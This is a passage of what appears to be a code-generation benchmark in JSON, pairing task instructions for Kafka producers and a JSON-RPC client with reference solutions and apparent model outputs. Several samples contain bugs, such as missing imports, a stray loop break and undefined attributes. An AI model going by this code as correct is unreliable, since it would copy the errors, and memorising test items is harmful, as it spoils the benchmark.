    "right_result": "from kafka import KafkaProducer\nfrom uuid import uuid4\nfrom typing import Iterable\n\nclass KafkaProducerWrapper:\n    def __init__(self, bootstrap_servers='localhost:9092'):\n        self._producer = KafkaProducer(bootstrap_servers=bootstrap_servers)\n        self._topic = str(uuid4())\n\n    def send(self, message: str | tuple[str, str]) -> None:\n        if isinstance(message, tuple):\n            self._producer.send(self._topic, key=message[0].encode('utf-8'), value=message[1].encode('utf-8'))\n        else:\n            self._producer.send(self._topic, value=message.encode('utf-8'))\n\n    def fill(self, messages: Iterable[str | tuple[str, str]]) -> None:\n        for message in messages:\n            self.send(message)\n        self._producer.flush()\n\n    def close(self) -> None:\n        self._producer.close()\n\n    @property\n    def topic(self) -> str:\n        return self._topic"
  },
  {
    "Task_id": 25,
    "Instruction": "Task Description: Create a Python class that implements JSON-RPC 2.0 client functionality over HTTP/HTTPS, capable of sending requests, validating responses, and handling connection management.\n\nClass Description: JSONRPCExecutor is a class that facilitates JSON-RPC 2.0 communication with a remote server through HTTP/HTTPS protocols. It handles connection establishment, request sending, response validation, and connection cleanup.\n\nAttributes:\n- command: Union[str, List[str]] - Command or list of commands to be executed\n- url: str - Target URL for the JSON-RPC endpoint\n- jsonrpc_method: str - JSON-RPC method name to be invoked\n- jsonrpc_params: Optional[List[Any]] - Parameters for the JSON-RPC method (default: empty list)\n- status: str - Expected HTTP status code pattern (default: \"^2\\d\\d$\")\n- result_validator: Callable[[Any], Tuple[bool, Optional[str]]] - Optional function to validate the result\n- verify_tls: bool - Flag to enable/disable TLS certificate verification (default: True)\n- method: str - HTTP method to use (default: \"POST\")\n\nMethods:\n- _send_request(conn: Union[HTTPConnection, HTTPSConnection]) -> None - Internal method to send the JSON-RPC request\n- _validate_response(response) -> bool - Internal method to validate the JSON-RPC response\n- execute() -> bool - Main method to execute the JSON-RPC call and return success status",
    "Canonical_solution": "import json\nimport ssl\nfrom http.client import HTTPConnection, HTTPSConnection\nfrom json import JSONDecodeError\nfrom typing import Any, Callable, List, Optional, Tuple, Union\n\nclass JSONRPCExecutor:\n    def __init__(\n        self,\n        command: Union[str, List[str]],\n        url: str,\n        jsonrpc_method: str,\n        jsonrpc_params: Optional[List[Any]] = None,\n        status: str = r\"^2\\d\\d$\",\n        result_validator: Callable[[Any], Tuple[bool, Optional[str]]] = None,\n        verify_tls: bool = True,\n        **kwargs,\n    ):\n        self.command = command\n        self.url = url\n        self.jsonrpc_method = jsonrpc_method\n        self.jsonrpc_params = jsonrpc_params if jsonrpc_method else []\n        self.status = status\n        self.result_validator = result_validator\n        self.verify_tls = verify_tls\n        self.method = \"POST\"\n\n    def _send_request(self, conn: Union[HTTPConnection, HTTPSConnection]):\n        req_body = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": self.jsonrpc_method,\n            \"params\": self.jsonrpc_params,\n            \"id\": repr(self),\n        }\n        conn.request(\n            method=self.method,\n            url=self.url.path,\n            body=json.dumps(req_body),\n            headers={\"Accept\": \"application/json\", \"Content-Type\": \"application/json\"},\n        )\n\n    def _validate_response(self, response):\n        try:\n            response = json.loads(response.read())\n            error = response.get(\"error\")\n            if error:\n                return False\n            assert response[\"jsonrpc\"] == \"2.0\", \"invalid jsonrpc version\"\n            assert \"id\" in response, \"no id in jsonrpc response\"\n            result = response[\"result\"]\n            if self.result_validator:\n                result_valid, reason = self.result_validator(result)\n                if not result_valid:\n                    return False\n        except (AssertionError, KeyError, UnicodeDecodeError, JSONDecodeError):\n            return False\n        return True\n\n    def execute(self):\n        try:\n            if self.url.scheme == \"http\":\n                conn = HTTPConnection(self.host, self.port)\n            elif self.url.scheme == \"https\":\n                ssl_context = None\n                if not self.verify_tls:\n                    ssl_context = ssl._create_unverified_context()\n                conn = HTTPSConnection(self.host, self.port, context=ssl_context)\n            else:\n                raise ValueError(f'Unsupported URL scheme: \"{self.url.scheme}\"')\n\n            self._send_request(conn)\n            response = conn.getresponse()\n            \n            if not self._validate_response(response):\n                return False\n\n            status = str(response.status)\n            if status == self.status or self.status_re.match(status):\n                conn.close()\n                return True\n\n        except Exception:\n            return False\n\n        return False",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import http.client\nimport json\nfrom typing import Union, List, Any, Tuple, Callable\n\nclass JSONRPCExecutor:\n    def __init__(self, command: Union[str, List[str]], url: str, jsonrpc_method: str, jsonrpc_params: Optional[List[Any]] = None, status: str = \"^2\\d\\d$\", result_validator: Callable[[Any], Tuple[bool, Optional[str]]] = None, verify_tls: bool = True, method: str = \"POST\"):\n        self.command = command\n        self.url = url\n        self.jsonrpc_method = jsonrpc_method\n        self.jsonrpc_params = jsonrpc_params if jsonrpc_params is not None else []\n        self.status = status\n        self.result_validator = result_validator\n        self.verify_tls = verify_tls\n        self.method = method\n\n    def _send_request(self, conn: Union[http.client.HTTPConnection, http.client.HTTPSConnection]) -> None:\n        headers = {\"Content-Type\": \"application/json\"}\n        payload = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": self.jsonrpc_method,\n            \"params\": self.jsonrpc_params,\n            \"id\": 1\n        }\n        if isinstance(self.command, list):\n            payload[\"id\"] = self.command[0]\n        else:\n            payload[\"id\"] = self.command\n        conn.request(self.method, self.url, json.dumps(payload), headers)\n        response = conn.getresponse()\n        if response.status != int(self.status[1:]):\n            raise Exception(f\"Unexpected HTTP status code: {response.status}\")\n        data = response.read().decode(\"utf-8\")\n        return data\n\n    def _validate_response(self, response: str) -> bool:\n        try:\n            data = json.loads(response)\n            if \"error\" in data:\n                return False\n            if self.result_validator:\n                valid, message = self.result_validator(data.get(\"result\"))\n                if not valid:\n                    return False\n            return True\n        except json.JSONDecodeError:\n            return False\n\n    def execute(self) -> bool:\n        if self.verify_tls:\n            conn = http.client.HTTPSConnection(self.url)\n        else:\n            conn = http.client.HTTPConnection(self.url)\n        try:\n            self._send_request(conn)\n            response = conn.getresponse().read().decode(\"utf-8\")\n            if self._validate_response(response):\n                return True\n            return False\n        finally:\n            conn.close()"
  },
  {
    "Task_id": 250,
    "Instruction": "Task Description: Implement a Kafka producer function that reads data from a file, sorts it by timestamp, and streams it to a Kafka topic at a controlled speed, with batch commit markers.\n\nFunction Description: The function reads JSON-formatted data from a file, extracts timestamps, sorts the data chronologically, and streams it to a specified Kafka topic. It maintains the original time intervals between records (adjusted by a speed factor) and inserts commit markers after each batch of records. Finally, it sends finish and commit markers before closing the producer.\n\nInput:\n- dataset_path: str - Path to the input file containing JSON records\n- speed: float (default=1) - Speed multiplier for time intervals (1.0 = realtime, 2.0 = 2x faster)\n- batch_size: float (default=500) - Number of records between commit markers\n\nOutput: None (Messages are sent to Kafka topic; no return value)",
    "Canonical_solution": "from kafka import KafkaProducer\n\nCOMMIT_COMMAND = \"*COMMIT*\"\nFINISH_COMMAND = \"*FINISH*\"\n\ndef kafka_producer(dataset_path: str, speed: float = 1, batch_size: float = 500):\n    dataset = []\n    with open(dataset_path, \"r\") as data_input:\n        for row in data_input:\n            created_at = json.loads(row)[\"tweet\"][\"created_at\"]\n            timestamp = datetime.datetime.strptime(created_at, \"%Y-%m-%dT%H:%M:%S.%fZ\")\n            dataset.append([timestamp, row])\n\n    dataset.sort(key=lambda x: x[0])\n\n    last_streamed_timestamp = None\n    producer = KafkaProducer(bootstrap_servers=[\"kafka:9092\"])\n    current_batch_size = 0\n    for timestamp, row in dataset:\n        if last_streamed_timestamp:\n            delta = (timestamp - last_streamed_timestamp).total_seconds() / speed\n            if delta > 0:\n                time.sleep(delta)\n                last_streamed_timestamp = timestamp\n        else:\n            last_streamed_timestamp = timestamp\n        producer.send(\"test_0\", row.encode(\"utf-8\", \"ignore\"), partition=0)\n        current_batch_size += 1\n        if current_batch_size >= batch_size:\n            producer.send(\"test_0\", COMMIT_COMMAND.encode(\"utf-8\"), partition=0)\n            current_batch_size = 0\n    producer.send(\"test_0\", COMMIT_COMMAND.encode(\"utf-8\"), partition=0)\n    producer.send(\"test_0\", FINISH_COMMAND.encode(\"utf-8\"), partition=0)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "import json\nimport time\nfrom kafka import KafkaProducer\nfrom datetime import datetime, timedelta\n\ndef kafka_producer(dataset_path, speed=1.0, batch_size=500):\n    with open(dataset_path, 'r') as f:\n        data = [json.loads(line) for line in f]\n\n    # Extract timestamps and sort data chronologically\n    sorted_data = sorted(data, key=lambda x: x['timestamp'])\n\n    # Initialize Kafka producer\n    producer = KafkaProducer(bootstrap_servers='localhost:9092',\n                             value_serializer=lambda v: json.dumps(v).encode('utf-8'))\n\n    # Prepare commit markers\n    commit_marker = {'type': 'commit'}\n    finish_marker = {'type': 'finish'}\n\n    # Process data in batches\n    batch = []\n    last_time = None\n    current_time = None\n\n    for i, record in enumerate(sorted_data):\n        timestamp = record['timestamp']\n        if last_time is not None:\n            delta = (timestamp - last_time).total_seconds()\n            current_time = last_time + timedelta(seconds=delta * speed)\n        else:\n            current_time = timestamp\n\n        # Adjust time to maintain speed\n        while current_time < timestamp:\n            current_time += timedelta(seconds=1.0 / speed)\n\n        # Send record at adjusted time\n        time.sleep((current_time - datetime.now()).total_seconds())\n        producer.send('output_topic', value=record)\n\n        batch.append(record)\n\n        # Check if batch is full or end of data\n        if len(batch) == batch_size or i == len(sorted_data) - 1:\n            # Send commit marker\n            producer.send('output_topic', value=commit_marker)\n            batch = []\n\n    # Send finish marker\n    producer.send('output_topic', value=finish_marker)\n\n    # Flush and close producer\n    producer.flush()\n    producer.close()"
  },
  {
    "Task_id": 251,
    "Instruction": "Task Description: Implement a Kafka exporter class that can send items to different Kafka topics based on their type, with configurable topic mappings and data converters.\n\nClass Description: KafkaItemExporter is a class that exports items to Kafka topics based on their type. It handles the connection to Kafka, message serialization, and routing items to appropriate topics using a configurable mapping.\n\nAttributes:\n- item_type_to_topic_mapping: [dict] - A dictionary mapping item types to Kafka topics\n- converter: [CompositeItemConverter] - A converter for processing items before export\n- connection_url: [str] - The Kafka bootstrap server connection URL\n- producer: [KafkaProducer] - The Kafka producer instance for sending messages\n\nMethods:\n- __init__(output: str, item_type_to_topic_mapping: dict, converters: tuple = ()) -> None - Initializes the exporter with Kafka connection URL, topic mappings, and optional converters\n- get_connection_url(output: str) -> str - Extracts the Kafka connection URL from the output parameter\n- export_items(items: list) -> None - Exports multiple items to Kafka\n- export_item(item: dict) -> None - Exports a single item to the appropriate Kafka topic based on its type\n- close() -> None - Closes the producer (currently a no-op in reference implementation)",
    "Canonical_solution": "from kafka import KafkaProducer\nimport json\nimport logging\n\nclass KafkaItemExporter:\n    def __init__(self, output, item_type_to_topic_mapping, converters=()):\n        self.item_type_to_topic_mapping = item_type_to_topic_mapping\n        self.converter = CompositeItemConverter(converters)\n        self.connection_url = self.get_connection_url(output)\n        self.producer = KafkaProducer(bootstrap_servers=self.connection_url)\n\n    def get_connection_url(self, output):\n        try:\n            return output.split('/')[1]\n        except KeyError:\n            raise Exception('Invalid kafka output param, It should be in format of \"kafka/127.0.0.1:9092\"')\n\n    def export_items(self, items):\n        for item in items:\n            self.export_item(item)\n\n    def export_item(self, item):\n        item_type = item.get('type')\n        if item_type is not None and item_type in self.item_type_to_topic_mapping:\n            data = json.dumps(item).encode('utf-8')\n            logging.debug(data)\n            return self.producer.send(self.item_type_to_topic_mapping[item_type], value=data)\n        else:\n            logging.warning('Topic for item type \"{}\" is not configured.'.format(item_type))\n\n    def close(self):\n        pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\nfrom typing import Dict, List, Tuple, Optional\n\nclass KafkaItemExporter:\n    def __init__(self, output: str, item_type_to_topic_mapping: Dict[str, str], converters: Tuple = ()) -> None:\n        self.item_type_to_topic_mapping = item_type_to_topic_mapping\n        self.converter = CompositeItemConverter(converters)\n        self.connection_url = self.get_connection_url(output)\n        self.producer = KafkaProducer(bootstrap_servers=self.connection_url)\n\n    def get_connection_url(self, output: str) -> str:\n        return output\n\n    def export_items(self, items: List[dict]) -> None:\n        for item in items:\n            self.export_item(item)\n\n    def export_item(self, item: dict) -> None:\n        item_type = item.get('type')\n        topic = self.item_type_to_topic_mapping.get(item_type)\n        if not topic:\n            raise ValueError(f\"Unknown item type: {item_type}\")\n        converted_item = self.converter.convert(item)\n        self.producer.send(topic, value=converted_item)\n\n    def close(self) -> None:\n        self.producer.close()"
  },
  {
    "Task_id": 252,
    "Instruction": "Task Description: Implement a Kafka message producer class in Python that can continuously send messages to a specified Kafka topic until stopped, with configurable server settings and message size.\n\nClass Description: The KafkaMessageProducer class provides functionality to send messages to a Kafka topic using a background thread. It maintains message statistics and allows graceful shutdown.\n\nAttributes:\n- producer: KafkaProducer - The Kafka producer instance for sending messages\n- topic: str - The Kafka topic to which messages will be sent\n- message: bytes - The message content to be sent (filled with '1's by default)\n- sent_count: int - Counter for tracking the number of messages sent\n- stop_event: threading.Event - Event flag to control the producer thread\n\nMethods:\n- __init__(bootstrap_servers: str = 'localhost:9092', topic: str = 'my-topic', message_size: int = 524288) -> None - Initializes the producer with server configuration, topic name, and message size\n- send_message() -> None - Sends a single message to the configured topic and increments the counter\n- run_producer() -> None - Continuously sends messages until stop_event is set, then flushes the producer\n- close() -> None - Signals the producer to stop and closes the Kafka producer connection",
    "Canonical_solution": "from kafka import KafkaProducer\nimport threading\n\nclass KafkaMessageProducer:\n    def __init__(self, bootstrap_servers='localhost:9092', topic='my-topic', message_size=524288):\n        self.producer = KafkaProducer(bootstrap_servers=bootstrap_servers)\n        self.topic = topic\n        self.message = b'1' * message_size\n        self.sent_count = 0\n        self.stop_event = threading.Event()\n\n    def send_message(self):\n        self.producer.send(self.topic, self.message)\n        self.sent_count += 1\n\n    def run_producer(self):\n        while not self.stop_event.is_set():\n            self.send_message()\n        self.producer.flush()\n\n    def close(self):\n        self.stop_event.set()\n        self.producer.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "right_result": "import threading\nfrom kafka import KafkaProducer\nimport time\n\nclass KafkaMessageProducer:\n    def __init__(self, bootstrap_servers: str = 'localhost:9092', topic: str = 'my-topic', message_size: int = 524288):\n        self.producer = KafkaProducer(bootstrap_servers=bootstrap_servers)\n        self.topic = topic\n        self.message = b'1' * message_size\n        self.sent_count = 0\n        self.stop_event = threading.Event()\n\n    def send_message(self) -> None:\n        self.producer.send(self.topic, self.message)\n        self.sent_count += 1\n\n    def run_producer(self) -> None:\n        while not self.stop_event.is_set():\n            self.send_message()\n            time.sleep(0.1)  # Adjust sleep time as needed\n\n    def close(self) -> None:\n        self.stop_event.set()\n        self.producer.flush()\n        self.producer.close()"
  },
  {
    "Task_id": 253,
    "Instruction": "Task Description: Create a Python class that extends the KafkaProducer class to provide enhanced message sending capabilities with future-based callbacks and context manager support.\n\nClass Description: DefaultProducer is a specialized Kafka producer that wraps the standard KafkaProducer functionality. It provides a more convenient interface for sending messages with built-in future callbacks and supports context management for proper resource cleanup.\n\nAttributes:\n(Inherits all attributes from KafkaProducer class)\n\nMethods:\nMethod1: send(topic: str, *, key: Optional[bytes] = None, value: Optional[bytes] = None) -> concurrent.futures.Future - Sends a message to the specified Kafka topic. Returns a Future object that will be completed when the message is successfully delivered or fails. The key and value parameters are optional message components.\n\nMethod2: __enter__() -> DefaultProducer - Enables the class to be used as a context manager. Returns the producer instance itself when entering the context.\n\nMethod3: __exit__(*args) -> None - Handles context manager exit by closing the producer and releasing resources. Accepts variable arguments for exception handling if needed.",
    "Canonical_solution": "from kafka import KafkaProducer\nimport concurrent.futures\nfrom typing import Optional\n\nclass DefaultProducer(KafkaProducer):\n    def send(\n        self,\n        topic: str,\n        *,\n        key: Optional[bytes] = None,\n        value: Optional[bytes] = None,\n    ) -> concurrent.futures.Future:\n        fut = concurrent.futures.Future()\n        kfut = super().send(topic, key=key, value=value)\n        kfut.add_callback(fut.set_result)\n        kfut.add_errback(fut.set_exception)\n        return fut\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, *args):\n        self.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\nimport concurrent.futures\n\nclass DefaultProducer(KafkaProducer):\n    def send(self, topic: str, *, key: Optional[bytes] = None, value: Optional[bytes] = None) -> concurrent.futures.Future:\n        return super().send(topic, key=key, value=value)\n\n    def __enter__(self) -> 'DefaultProducer':\n        return self\n\n    def __exit__(self, *args) -> None:\n        self.close()"
  },
  {
    "Task_id": 255,
    "Instruction": "Task Description: Implement a function that sends messages to a Kafka topic, ensuring the topic exists before sending messages and properly managing resources.\n\nFunction Description: The function `kafka_producer` sends messages from a file to a specified Kafka topic. It first checks if the topic exists and creates it if necessary. Then, it reads lines from the input file, encodes them, and sends them to the Kafka topic using a producer instance. The function includes logging for progress tracking and ensures proper cleanup by closing the producer and admin client.\n\nInput:  \n- `servers`: [str] - Comma-separated list of Kafka bootstrap servers.  \n- `topic`: [str] - The name of the Kafka topic to which messages will be sent.  \n- `input_path`: [str] - The path to the input file containing messages to be sent.  \n- `timeout`: [int] - The timeout in seconds for the Kafka producer request.  \n\nOutput:  \n- None: The function does not return any value but sends messages to the specified Kafka topic and logs progress.",
    "Canonical_solution": "import argparse\nimport logging\nimport sys\nfrom kafka import KafkaAdminClient\nfrom kafka import KafkaProducer\nfrom kafka.admin import NewTopic\n\ndef kafka_producer(servers, topic, input_path, timeout):\n    admin_clt = KafkaAdminClient(bootstrap_servers=servers)\n    if topic not in admin_clt.list_topics():\n        admin_clt.create_topics(\n            new_topics=[\n                NewTopic(\n                    name=topic,\n                    num_partitions=1,\n                    replication_factor=1,\n                    topic_configs={'max.message.bytes': 1024 * 1024 * 1024})\n            ],\n            validate_only=False)\n        logging.info('create increment save topic: %s' % topic)\n    admin_clt.close()\n\n    producer = KafkaProducer(\n        bootstrap_servers=servers,\n        request_timeout_ms=timeout * 1000,\n        api_version=(0, 10, 1))\n\n    i = 1\n    with open(input_path, 'r') as fin:\n        for line_str in fin:\n            producer.send(topic, line_str.encode('utf-8'))\n            i += 1\n            break\n            if i % 100 == 0:\n                logging.info('progress: %d' % i)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer, KafkaAdminClient, KafkaException\nimport logging\nimport time\n\nlogging.basicConfig(level=logging.INFO)\n\ndef kafka_producer(servers, topic, input_path, timeout):\n    try:\n        # Create admin client to check and create topic\n        admin_client = KafkaAdminClient(bootstrap_servers=servers)\n        # Check if topic exists\n        topics = admin_client.list_topics()\n        if topic not in topics:\n            # Create topic if it doesn't exist\n            admin_client.create_topics([KafkaAdminClient.Topic(topic, num_partitions=1, replication_factor=1)])\n            logging.info(f\"Topic '{topic}' created successfully.\")\n        else:\n            logging.info(f\"Topic '{topic}' already exists.\")\n\n        # Close admin client\n        admin_client.close()\n\n        # Create producer\n        producer = KafkaProducer(bootstrap_servers=servers,\n                                 value_serializer=lambda v: v.encode('utf-8'),\n                                 request_timeout_ms=timeout * 1000)\n\n        logging.info(f\"Starting to send messages to topic '{topic}' from file '{input_path}'.\")\n\n        # Read lines from input file\n        with open(input_path, 'r') as file:\n            for line in file:\n                message = line.strip()\n                if message:\n                    producer.send(topic, message)\n                    logging.info(f\"Sent message: {message}\")\n                    time.sleep(0.1)  # Add a small delay to avoid overwhelming the system\n\n        # Wait for all messages to be sent\n        producer.flush()\n\n        logging.info(\"All messages sent successfully.\")\n\n    except KafkaException as e:\n        logging.error(f\"Kafka error: {e}\")\n\n    finally:\n        # Close producer\n        if 'producer' in locals():\n            producer.close()\n        # Close admin client if it's still open\n        if 'admin_client' in locals():\n            admin_client.close()"
  },
  {
    "Task_id": 256,
    "Instruction": "Task Description: Create a Python function to interact with a Kafka producer for sending messages to a specified topic.\n\nFunction Description: The function creates a Kafka producer instance, sends messages to a specified topic, and properly closes the producer to release resources. The producer is configured with a bootstrap server and a value serializer to encode messages in UTF-8 format.\n\nInput:\n- `bootstrap_servers` (str): The address and port of the Kafka bootstrap server (e.g., \"127.0.0.1:9092\").\n- `topic` (str): The name of the Kafka topic to which the message will be sent.\n- `message_body` (dict): The message content to be sent, provided as a dictionary.\n\nOutput:\n- `producer` (KafkaProducer): An instance of the KafkaProducer configured with the specified bootstrap server and serializer. This is returned by the `create_kafka_producer` function.\n- The `send_kafka_message` function sends the message to the specified topic but does not return any value.\n- The `close_kafka_producer` function closes the producer and does not return any value.",
    "Canonical_solution": "from kafka import KafkaProducer\n\ndef create_kafka_producer():\n    producer = KafkaProducer(\n        bootstrap_servers=\"127.0.0.1:9092\",\n        value_serializer=lambda v: str(v).encode(\"utf-8\"),\n    )\n    return producer\n\ndef send_kafka_message(producer, topic, message_body):\n    producer.send(topic, key=None, value=dict(message_body))\n\ndef close_kafka_producer(producer):\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\n\ndef create_kafka_producer(bootstrap_servers):\n    producer = KafkaProducer(\n        bootstrap_servers=bootstrap_servers,\n        value_serializer=lambda v: str(v).encode('utf-8')\n    )\n    return producer\n\ndef send_kafka_message(producer, topic, message_body):\n    producer.send(topic, value=message_body)\n\ndef close_kafka_producer(producer):\n    producer.close()"
  },
  {
    "Task_id": 257,
    "Instruction": "Task Description: Implement a Kafka producer class that writes JSON data to a Kafka topic with batch processing capabilities, including size-based and time-based batch commits, and a total message limit.\n\nClass Description: KafkaWriter is a class that handles writing messages to a Kafka topic with configurable batch processing. It manages batch commits based on either reaching a maximum batch size or a maximum batch lifetime, and can automatically close after sending a specified total number of messages.\n\nAttributes:\n_max_batch_size: [int] - Maximum number of messages in a batch before committing\n_max_batch_lifetime: [datetime.timedelta] - Maximum duration a batch can exist before committing\n_limit: [int] - Total number of messages to write before finishing\n_total_written: [int] - Counter for total messages written\n_total_written_after_commit: [int] - Counter for messages written since last commit\n_last_commit_at: [datetime.datetime] - Timestamp of last commit\n_current_seq_id: [int] - Sequence ID for tracking batches\n_producer: [KafkaProducer] - Kafka producer instance for message sending\n\nMethods:\n__init__(max_batch_size: int, max_batch_lifetime_sec: int, limit: int) -> None - Initializes the KafkaWriter with batch size, batch lifetime in seconds, and total message limit\nwrite(json_data: dict) -> None - Writes JSON data to Kafka topic, handles batch committing based on size or time thresholds\nclose() -> None - Properly closes the Kafka producer to release resources",
    "Canonical_solution": "from kafka import KafkaProducer\nimport json\nimport datetime\nimport os\n\nclass KafkaWriter:\n    def __init__(self, max_batch_size, max_batch_lifetime_sec, limit):\n        self._max_batch_size = max_batch_size\n        self._max_batch_lifetime = datetime.timedelta(seconds=max_batch_lifetime_sec)\n        self._limit = limit\n\n        self._total_written = 0\n        self._total_written_after_commit = 0\n        self._last_commit_at = None\n        self._current_seq_id = 0\n\n        self._producer = KafkaProducer(bootstrap_servers=[\"kafka:9092\"])\n\n    def write(self, json_data):\n        self._producer.send(\n            \"test_0\",\n            json.dumps(json_data).encode(\"utf-8\"),\n            partition=0,\n        )\n\n        if not self._last_commit_at:\n            self._last_commit_at = datetime.datetime.now()\n\n        self._total_written += 1\n        self._total_written_after_commit += 1\n        batch_exists_for = datetime.datetime.now() - self._last_commit_at\n\n        size_limit_reached = self._total_written_after_commit == self._max_batch_size\n        duration_limit_reached = batch_exists_for >= self._max_batch_lifetime\n\n        if size_limit_reached or duration_limit_reached:\n            self._last_commit_at = datetime.datetime.now()\n            self._producer.send(\n                \"test_0\",\n                \"*COMMIT*\".encode(\"utf-8\"),\n                partition=0,\n            )\n            self._total_written_after_commit = 0\n            self._current_seq_id += 1\n\n        if self._total_written == self._limit:\n            self._producer.send(\n                \"test_0\",\n                \"*FINISH*\".encode(\"utf-8\"),\n                partition=0,\n            )\n            self._producer.close()\n            exit(0)\n\n    def close(self):\n        self._producer.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\nimport json\nimport time\nfrom datetime import datetime, timedelta\n\nclass KafkaWriter:\n    def __init__(self, max_batch_size: int, max_batch_lifetime_sec: int, limit: int) -> None:\n        self._max_batch_size = max_batch_size\n        self._max_batch_lifetime = timedelta(seconds=max_batch_lifetime_sec)\n        self._limit = limit\n        self._total_written = 0\n        self._total_written_after_commit = 0\n        self._last_commit_at = datetime.now()\n        self._current_seq_id = 0\n        self._producer = KafkaProducer(bootstrap_servers='localhost:9092', value_serializer=lambda v: json.dumps(v).encode('utf-8'))\n\n    def write(self, json_data: dict) -> None:\n        self._total_written += 1\n        self._total_written_after_commit += 1\n\n        if self._total_written_after_commit == self._max_batch_size or (datetime.now() - self._last_commit_at) > self._max_batch_lifetime:\n            self._commit()\n            self._total_written_after_commit = 0\n            self._last_commit_at = datetime.now()\n\n        self._producer.send('my-topic', value=json_data)\n\n    def _commit(self):\n        self._producer.flush()\n        self._current_seq_id += 1\n\n    def close(self) -> None:\n        self._producer.close()"
  },
  {
    "Task_id": 258,
    "Instruction": "Task Description: Create a function that generates and sends timestamped messages to Kafka topics with different timezone configurations.\n\nFunction Description: The function generates a stream of messages containing timestamps in two different timezones (America/New_York and Europe/Paris) and sends them randomly to two Kafka topics. Each message includes a timestamp in its respective timezone and a sequential message number. The function handles Kafka producer initialization, message generation, sending, and proper resource cleanup.\n\nInput: \n- None (The function uses internal constants for configuration)\n\nOutput: \n- None (The function's effect is sending messages to Kafka topics)\n\nNote: The function uses the following internal configurations:\n- input_size: int = 100 (number of messages to generate)\n- topic1: str = \"timezone1\" (first Kafka topic)\n- topic2: str = \"timezone2\" (second Kafka topic)\n- timezone1: ZoneInfo = ZoneInfo(\"America/New_York\")\n- timezone2: ZoneInfo = ZoneInfo(\"Europe/Paris\")\n- str_repr: str = \"%Y-%m-%d %H:%M:%S.%f %z\" (timestamp format)\n- api_version: tuple = (0, 10, 2) (Kafka API version)\n- bootstrap_servers: list = [\"kafka:9092\"] (Kafka server address)\n- security_protocol: str = \"PLAINTEXT\" (connection protocol)",
    "Canonical_solution": "import json\nimport random\nimport time\nfrom datetime import datetime\nfrom zoneinfo import ZoneInfo\nfrom kafka import KafkaProducer\n\ndef generate_stream():\n    input_size = 100\n    random.seed(0)\n    topic1 = \"timezone1\"\n    topic2 = \"timezone2\"\n    timezone1 = ZoneInfo(\"America/New_York\")\n    timezone2 = ZoneInfo(\"Europe/Paris\")\n    str_repr = \"%Y-%m-%d %H:%M:%S.%f %z\"\n    api_version = (0, 10, 2)\n\n    time.sleep(30)\n    producer1 = KafkaProducer(\n        bootstrap_servers=[\"kafka:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=api_version,\n    )\n    producer2 = KafkaProducer(\n        bootstrap_servers=[\"kafka:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=api_version,\n    )\n\n    def send_message(timezone: ZoneInfo, producer: KafkaProducer, i: int):\n        timestamp = datetime.now(timezone)\n        message_json = {\"date\": timestamp.strftime(str_repr), \"message\": str(i)}\n        producer.send(topic1, (json.dumps(message_json)).encode(\"utf-8\"))\n\n    for i in range(input_size):\n        if random.choice([True, False]):\n            send_message(timezone1, producer1, i)\n        else:\n            send_message(timezone2, producer2, i)\n        time.sleep(1)\n\n    time.sleep(2)\n    producer1.close()\n    producer2.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "from datetime import datetime, timezone\nfrom zoneinfo import ZoneInfo\nfrom kafka import KafkaProducer\nimport random\nimport time\n\ninput_size = 100\ntopic1 = \"timezone1\"\ntopic2 = \"timezone2\"\ntimezone1 = ZoneInfo(\"America/New_York\")\ntimezone2 = ZoneInfo(\"Europe/Paris\")\nstr_repr = \"%Y-%m-%d %H:%M:%S.%f %z\"\napi_version = (0, 10, 2)\nbootstrap_servers = [\"kafka:9092\"]\nsecurity_protocol = \"PLAINTEXT\"\n\ndef generate_messages():\n    messages = []\n    for i in range(input_size):\n        ny_time = datetime.now(timezone1).strftime(str_repr)\n        paris_time = datetime.now(timezone2).strftime(str_repr)\n        messages.append((ny_time, paris_time, i))\n    return messages\n\ndef send_messages(messages):\n    producer = KafkaProducer(bootstrap_servers=bootstrap_servers,\n                             api_version=api_version,\n                             security_protocol=security_protocol)\n    for message in messages:\n        topic = random.choice([topic1, topic2])\n        producer.send(topic, value=f\"{message[0]} {message[1]} {message[2]}\".encode('utf-8'))\n    producer.flush()\n    producer.close()\n\nif __name__ == \"__main__\":\n    messages = generate_messages()\n    send_messages(messages)"
  },
  {
    "Task_id": 259,
    "Instruction": "Task Description: Implement a KafkaProducer class in Python that can send messages to a Kafka cluster with configurable settings for serialization, partitioning, compression, and message delivery guarantees.\n\nClass Description: The KafkaProducer class is a high-level producer client that publishes messages to Kafka topics. It handles message serialization, partitioning, batching, and retries for failed requests. The producer is thread-safe and manages background threads for message accumulation and network I/O.\n\nAttributes:\n- config: [dict] - Configuration parameters for the producer including bootstrap servers, serializers, acks, etc.\n- _metrics: [Metrics] - Tracks producer performance metrics\n- _accumulator: [RecordAccumulator] - Batches messages by topic-partition before sending\n- _metadata: [ClusterMetadata] - Maintains cluster metadata including topic partitions\n- _sender: [Sender] - Background thread that sends batched messages to brokers\n- _closed: [bool] - Flag indicating if producer has been closed\n- _cleanup: [function] - Cleanup handler registered with atexit\n\nMethods:\n- __init__(**configs) -> None - Initializes the producer with given configuration overrides\n- send(topic, value=None, key=None, headers=None, partition=None, timestamp_ms=None) -> FutureRecordMetadata - Asynchronously sends a message to the specified topic and returns a future\n- flush(timeout=None) -> None - Ensures all buffered messages are delivered within timeout\n- close(timeout=None) -> None - Closes the producer and releases resources\n- _cleanup_factory() -> function - Creates cleanup function for atexit registration\n- _unregister_cleanup() -> None - Removes cleanup handler from atexit\n- _max_usable_produce_magic() -> int - Determines message format version based on API version\n- _estimate_size_in_bytes(key, value, headers=[]) -> int 